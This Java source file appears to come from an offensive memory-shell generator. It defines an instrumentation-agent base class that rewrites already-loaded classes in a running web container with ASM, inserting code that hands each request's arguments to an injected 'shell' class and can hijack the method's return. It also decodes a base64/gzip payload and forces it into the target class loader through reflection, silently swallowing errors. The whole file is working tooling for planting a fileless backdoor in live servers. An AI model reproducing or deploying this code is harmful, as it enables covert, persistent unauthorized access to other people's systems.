package org.leo.jmg.mem.agent;

import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;
import org.objectweb.asm.tree.AbstractInsnNode;
import org.objectweb.asm.tree.ClassNode;
import org.objectweb.asm.tree.InsnList;
import org.objectweb.asm.tree.InsnNode;
import org.objectweb.asm.tree.IntInsnNode;
import org.objectweb.asm.tree.JumpInsnNode;
import org.objectweb.asm.tree.LabelNode;
import org.objectweb.asm.tree.LdcInsnNode;
import org.objectweb.asm.tree.MethodInsnNode;
import org.objectweb.asm.tree.MethodNode;
import org.objectweb.asm.tree.TryCatchBlockNode;
import org.objectweb.asm.tree.TypeInsnNode;
import org.objectweb.asm.tree.VarInsnNode;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.zip.GZIPInputStream;

/** 多容器 Agent 挂载共用的字节码转换实现。 */
public abstract class AgentInjectorSupport implements ClassFileTransformer {

    protected abstract String[] targetClasses();

    protected abstract String targetMethodName();

    protected String[] targetMethodNames(String className) {
        return new String[]{targetMethodName()};
    }

    protected abstract String shellClassName();

    protected abstract String shellClassPayload();

    public static void launch(Instrumentation instrumentation,
                              AgentInjectorSupport transformer) throws Exception {
        instrumentation.addTransformer(transformer, true);
        Class[] loadedClasses = instrumentation.getAllLoadedClasses();
        for (int i = 0; i < loadedClasses.length; i++) {
            Class loaded = loadedClasses[i];
            if (transformer.isTarget(loaded.getName().replace('.', '/'))
                    && instrumentation.isModifiableClass(loaded)) {
                instrumentation.retransformClasses(new Class[]{loaded});
            }
        }
    }

    @Override
    @SuppressWarnings("all")
    public byte[] transform(ClassLoader loader, String className,
                            Class classBeingRedefined, ProtectionDomain domain,
                            byte[] classfileBuffer) {
        if (!isTarget(className)) return classfileBuffer;
        try {
            ensureShellClass(loader);
            ClassReader reader = new ClassReader(classfileBuffer);
            ClassNode node = new ClassNode(Opcodes.ASM9);
            reader.accept(node, ClassReader.EXPAND_FRAMES);
            boolean transformed = false;
            for (int i = 0; i < node.methods.size(); i++) {
                MethodNode method = (MethodNode) node.methods.get(i);
                int returnSort = Type.getReturnType(method.desc).getSort();
                if (isTargetMethod(className, method.name)
                        && (returnSort == Type.VOID || returnSort == Type.INT)) {
                    method.instructions.insert(buildAdvice(method));
                    transformed = true;
                }
            }
            if (!transformed) return classfileBuffer;
            ClassWriter writer = new AgentClassWriter(reader,
                    ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES, loader);
            node.accept(writer);
            return writer.toByteArray();
        } catch (Throwable ignored) {
            return classfileBuffer;
        }
    }

    private InsnList buildAdvice(MethodNode method) {
        Type[] arguments = Type.getArgumentTypes(method.desc);
        InsnList code = new InsnList();
        LabelNode start = new LabelNode();
        LabelNode end = new LabelNode();
        LabelNode handler = new LabelNode();
        LabelNode continueOriginal = new LabelNode();

        code.add(start);
        String shellInternalName = shellClassName().replace('.', '/');
        code.add(new TypeInsnNode(Opcodes.NEW, shellInternalName));
        code.add(new InsnNode(Opcodes.DUP));
        code.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, shellInternalName,
                "<init>", "()V", false));
        pushInteger(code, arguments.length);
        code.add(new TypeInsnNode(Opcodes.ANEWARRAY, "java/lang/Object"));

        int local = (method.access & Opcodes.ACC_STATIC) == 0 ? 1 : 0;
        for (int i = 0; i < arguments.length; i++) {
            Type type = arguments[i];
            code.add(new InsnNode(Opcodes.DUP));
            pushInteger(code, i);
            code.add(new VarInsnNode(type.getOpcode(Opcodes.ILOAD), local));
            box(code, type);
            code.add(new InsnNode(Opcodes.AASTORE));
            local += type.getSize();
        }
        code.add(new MethodInsnNode(Opcodes.INVOKEVIRTUAL, "java/lang/Object",
                "equals", "(Ljava/lang/Object;)Z", false));
        code.add(new JumpInsnNode(Opcodes.IFEQ, end));
        if (Type.getReturnType(method.desc).getSort() == Type.INT) {
            code.add(new InsnNode(Opcodes.ICONST_2));
            code.add(new InsnNode(Opcodes.IRETURN));
        } else {
            code.add(new InsnNode(Opcodes.RETURN));
        }
        code.add(end);
        code.add(new JumpInsnNode(Opcodes.GOTO, continueOriginal));
        code.add(handler);
        code.add(new InsnNode(Opcodes.POP));
        code.add(continueOriginal);
        method.tryCatchBlocks.add(0,
                new TryCatchBlockNode(start, end, handler, "java/lang/Throwable"));
        return code;
    }

    private static void box(InsnList code, Type type) {
        switch (type.getSort()) {
            case Type.BOOLEAN:
                valueOf(code, "java/lang/Boolean", "(Z)Ljava/lang/Boolean;");
                break;
            case Type.BYTE:
                valueOf(code, "java/lang/Byte", "(B)Ljava/lang/Byte;");
                break;
            case Type.CHAR:
                valueOf(code, "java/lang/Character", "(C)Ljava/lang/Character;");
                break;
            case Type.SHORT:
                valueOf(code, "java/lang/Short", "(S)Ljava/lang/Short;");
                break;
            case Type.INT:
                valueOf(code, "java/lang/Integer", "(I)Ljava/lang/Integer;");
                break;
            case Type.FLOAT:
                valueOf(code, "java/lang/Float", "(F)Ljava/lang/Float;");
                break;
            case Type.LONG:
                valueOf(code, "java/lang/Long", "(J)Ljava/lang/Long;");
                break;
            case Type.DOUBLE:
                valueOf(code, "java/lang/Double", "(D)Ljava/lang/Double;");
                break;
            default:
                break;
        }
    }

    private static void valueOf(InsnList code, String owner, String descriptor) {
        code.add(new MethodInsnNode(Opcodes.INVOKESTATIC, owner, "valueOf", descriptor, false));
    }

    private static void pushInteger(InsnList code, int value) {
        AbstractInsnNode instruction;
        if (value >= -1 && value <= 5) {
            instruction = new InsnNode(Opcodes.ICONST_0 + value);
        } else if (value <= Byte.MAX_VALUE) {
            instruction = new IntInsnNode(Opcodes.BIPUSH, value);
        } else if (value <= Short.MAX_VALUE) {
            instruction = new IntInsnNode(Opcodes.SIPUSH, value);
        } else {
            instruction = new LdcInsnNode(Integer.valueOf(value));
        }
        code.add(instruction);
    }

    private boolean isTarget(String className) {
        if (className == null) return false;
        String[] targets = targetClasses();
        for (int i = 0; i < targets.length; i++) {
            if (targets[i].equals(className)) return true;
        }
        return false;
    }

    private boolean isTargetMethod(String className, String methodName) {
        String[] methods = targetMethodNames(className);
        for (int i = 0; i < methods.length; i++) {
            if (methods[i].equals(methodName)) return true;
        }
        return false;
    }

    @SuppressWarnings("all")
    private void ensureShellClass(ClassLoader loader) throws Exception {
        try {
            loader.loadClass(shellClassName());
            return;
        } catch (ClassNotFoundException ignored) {
        }
        byte[] bytes = gzipDecompress(decodeBase64(shellClassPayload()));
        java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        defineClass.invoke(loader, bytes, Integer.valueOf(0), Integer.valueOf(bytes.length));
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Exception ignored) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, value);
        }
    }

    private static byte[] gzipDecompress(byte[] bytes) throws Exception {
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] block = new byte[4096];
        int read;
        while ((read = input.read(block)) != -1) output.write(block, 0, read);
        input.close();
        return output.toByteArray();
    }
}
